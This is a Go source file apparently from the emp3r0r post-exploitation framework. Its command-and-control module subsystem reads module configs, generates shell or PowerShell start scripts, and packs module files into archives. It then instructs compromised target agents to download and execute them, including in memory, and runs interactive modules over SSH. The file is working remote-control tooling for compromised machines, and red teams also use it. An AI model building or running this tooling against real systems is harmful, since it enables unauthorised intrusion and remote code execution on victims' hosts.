//go:build linux
// +build linux

package cc

import (
	"encoding/json"
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/google/uuid"
	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/olekukonko/tablewriter"
)

// ModConfig config.json of a module
// Example
//
//	{
//	    "name": "LES",
//	    "exec": "les.sh",
//	    "platform": "Linux",
//	    "interactive": false,
//	    "author": "jm33-ng",
//	    "date": "2022-01-12",
//	    "comment": "https://github.com/mzet-/linux-exploit-suggester",
//	    "options": {
//	        "args": ["--checksec", "run les.sh with this commandline arg"]
//	    }
//	}

// stores module configs
var ModuleConfigs = make(map[string]emp3r0r_data.ModConfig, 1)

// stores module names for fuzzy search
var ModuleNames = make(map[string]string)

// moduleCustom run a custom module
func moduleCustom() {
	go func() {
		start_script := WWWRoot + CurrentMod + ".sh"
		if CurrentTarget.GOOS == "windows" {
			start_script = WWWRoot + CurrentMod + ".ps1"
		}

		// get module config
		config, exists := ModuleConfigs[CurrentMod]
		if !exists {
			CliPrintError("Config of %s does not exist", CurrentMod)
			return
		}
		for opt, val := range config.Options {
			val[0] = Options[opt].Val
		}

		// most of the time, start script is the only file changing
		// and it's very small, so we host it for agents to download
		err = genStartScript(&config, start_script)
		if err != nil {
			CliPrintError("Generating start script: %v", err)
			return
		}
		if config.IsInteractive {
			// empty out start script
			// we will run the module as shell
			err = os.WriteFile(start_script, []byte("echo emp3r0r-interactive-module\n"), 0o600)
			if err != nil {
				CliPrintError("write %s: %v", start_script, err)
				return
			}
		}

		// in-memory module
		if config.InMemory {
			cmd := fmt.Sprintf("%s --mod %s --in_mem", emp3r0r_data.C2CmdCustomModule, CurrentMod)
			cmd_id := uuid.NewString()
			err = SendCmdToCurrentTarget(cmd, cmd_id)
			if err != nil {
				CliPrintError("Sending command %s to %s: %v", cmd, CurrentTarget.Tag, err)
			}
			return
		}

		// compress module files
		tarball := WWWRoot + CurrentMod + ".tar.xz"
		if !util.IsFileExist(tarball) {
			CliPrintInfo("Compressing %s with xz...", CurrentMod)
			path := fmt.Sprintf("%s/%s", config.Path, CurrentMod)
			err = util.TarXZ(path, tarball)
			if err != nil {
				CliPrintError("Compressing %s: %v", CurrentMod, err)
				return
			}
			CliPrintInfo("Created %.4fMB archive (%s) for module '%s'",
				float64(util.FileSize(tarball))/1024/1024, tarball, CurrentMod)
		}

		// tell agent to download and execute this module
		checksum := tun.SHA256SumFile(tarball)
		cmd := fmt.Sprintf("%s --mod_name %s --checksum %s", emp3r0r_data.C2CmdCustomModule, CurrentMod, checksum)
		cmd_id := uuid.NewString()
		err = SendCmdToCurrentTarget(cmd, cmd_id)
		if err != nil {
			CliPrintError("Sending command %s to %s: %v", cmd, CurrentTarget.Tag, err)
		}

		// interactive module
		if config.IsInteractive {
			opt, exits := config.Options["args"]
			if !exits {
				config.Options["args"] = []string{"--", "No args"}
			}
			args := opt[0]
			port := strconv.Itoa(util.RandInt(1024, 65535))

			// wait until the module is ready
			for i := 0; i < 10; i++ {
				if strings.Contains(CmdResults[cmd_id], "emp3r0r-interactive-module") {
					break
				}
				time.Sleep(time.Second)
			}
			if !strings.Contains(CmdResults[cmd_id], "emp3r0r-interactive-module") {
				CliPrintError("%s failed to upload", CurrentMod)
				return
			}

			// do it
			sshErr := SSHClient(fmt.Sprintf("%s/%s/%s",
				RuntimeConfig.AgentRoot, CurrentMod, config.Exec),
				args, port, false)
			if sshErr != nil {
				CliPrintError("module %s: %v", config.Name, sshErr)
				return
			}
		}
	}()
}

// Print module meta data
func ModuleDetails(modName string) {
	config, exists := ModuleConfigs[modName]
	if !exists {
		return
	}

	// build table
	tdata := [][]string{}
	tableString := &strings.Builder{}
	table := tablewriter.NewWriter(tableString)
	table.SetHeader([]string{"Name", "Exec", "Platform", "Author", "Date", "Comment"})
	table.SetBorder(true)
	table.SetRowLine(true)
	table.SetAutoWrapText(true)
	table.SetColWidth(20)

	// color
	table.SetHeaderColor(tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
		tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
		tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
		tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
		tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
		tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor})

	table.SetColumnColor(tablewriter.Colors{tablewriter.FgHiBlueColor},
		tablewriter.Colors{tablewriter.FgBlueColor},
		tablewriter.Colors{tablewriter.FgBlueColor},
		tablewriter.Colors{tablewriter.FgBlueColor},
		tablewriter.Colors{tablewriter.FgBlueColor},
		tablewriter.Colors{tablewriter.FgBlueColor})

	// fill table
	tdata = append(tdata, []string{config.Name, config.Exec, config.Platform, config.Author, config.Date, config.Comment})
	table.AppendBulk(tdata)
	table.Render()
	out := tableString.String()
	AdaptiveTable(out)
	CliPrintInfo("Module details:\n%s", out)
}

// scan custom modules in ModuleDir,
// and update ModuleHelpers, ModuleDocs
func InitModules() {
	if !util.IsExist(WWWRoot) {
		os.MkdirAll(WWWRoot, 0o700)
	}

	// get vaccine ready
	if !util.IsExist(UtilsArchive) {
		err = CreateVaccineArchive()
		if err != nil {
			CliPrintWarning("CreateVaccineArchive: %v", err)
		}
	}

	load_mod := func(mod_dir string) {
		// don't bother if module dir not found
		if !util.IsExist(mod_dir) {
			return
		}
		CliPrintInfo("Scanning %s for modules", mod_dir)
		dirs, readdirErr := os.ReadDir(mod_dir)
		if readdirErr != nil {
			CliPrintError("Failed to scan custom modules: %v", readdirErr)
			return
		}
		for _, dir := range dirs {
			if !dir.IsDir() {
				continue
			}
			config_file := fmt.Sprintf("%s/%s/config.json", mod_dir, dir.Name())
			if !util.IsExist(config_file) {
				continue
			}
			config, readConfigErr := readModCondig(config_file)
			if readConfigErr != nil {
				CliPrintWarning("Reading config from %s: %v", dir.Name(), readConfigErr)
				continue
			}

			// module path, eg. ~/.emp3r0r/modules
			config.Path = mod_dir

			// add to module helpers
			ModuleHelpers[config.Name] = moduleCustom

			// add module meta data
			emp3r0r_data.Modules[config.Name] = config

			readConfigErr = updateModuleHelp(config)
			if readConfigErr != nil {
				CliPrintWarning("Loading config from %s: %v", config.Name, readConfigErr)
				continue
			}
			ModuleConfigs[config.Name] = *config
			CliPrintInfo("Loaded module %s", strconv.Quote(config.Name))
		}

		// make []string for fuzzysearch
		for name, modObj := range emp3r0r_data.Modules {
			ModuleNames[name] = modObj.Comment
		}
	}

	// read from every defined module dir
	for _, mod_dir := range ModuleDirs {
		load_mod(mod_dir)
	}

	CliPrintInfo("Loaded %d modules", len(ModuleHelpers))
}

// readModCondig read config.json of a module
func readModCondig(file string) (pconfig *emp3r0r_data.ModConfig, err error) {
	// read JSON
	jsonData, err := os.ReadFile(file)
	if err != nil {
		return nil, fmt.Errorf("Read %s: %v", file, err)
	}

	// parse the json
	config := emp3r0r_data.ModConfig{}
	err = json.Unmarshal(jsonData, &config)
	if err != nil {
		return nil, fmt.Errorf("failed to unmarshal JSON config: %v", err)
	}
	pconfig = &config
	return
}

// genStartScript reads config.json of a module and generates a start script to invoke the module
func genStartScript(config *emp3r0r_data.ModConfig, outfile string) error {
	module_exec_path := fmt.Sprintf("%s/%s/%s", config.Path, config.Name, config.Exec)
	var builder strings.Builder

	setEnvVar := func(opt, value string) {
		if CurrentTarget.GOOS == "windows" {
			fmt.Fprintf(&builder, "$env:%s='%s' ", opt, value)
		} else {
			fmt.Fprintf(&builder, "%s='%s' ", opt, value)
		}
	}

	for opt, val_help := range config.Options {
		setEnvVar(opt, val_help[0])
	}

	// Append execution command
	if CurrentTarget.GOOS == "windows" {
		// when it's not a powershell script, just run it
		if !strings.HasSuffix(config.Exec, ".ps1") {
			builder.WriteString(fmt.Sprintf("\n.\\%s", config.Exec))
		}
		// else we will append the script to start.ps1
		mod_data, readErr := os.ReadFile(module_exec_path)
		if readErr != nil {
			return readErr
		}
		builder.WriteString(fmt.Sprintf("\n%s", mod_data))
	} else {
		builder.WriteString(fmt.Sprintf(" ./%s", config.Exec))
	}
	defer builder.Reset()
	_ = os.WriteFile(outfile+".orig", []byte(builder.String()), 0o600)

	// write to file
	return os.WriteFile(outfile, []byte(builder.String()), 0o600)
}

func updateModuleHelp(config *emp3r0r_data.ModConfig) error {
	help_map := make(map[string][]string)
	for opt, val_help := range config.Options {
		if len(val_help) < 2 {
			return fmt.Errorf("%s config error: %s incomplete", config.Name, opt)
		}
		help_map[opt] = val_help
		emp3r0r_data.Modules[config.Name].Options = help_map
	}
	return nil
}
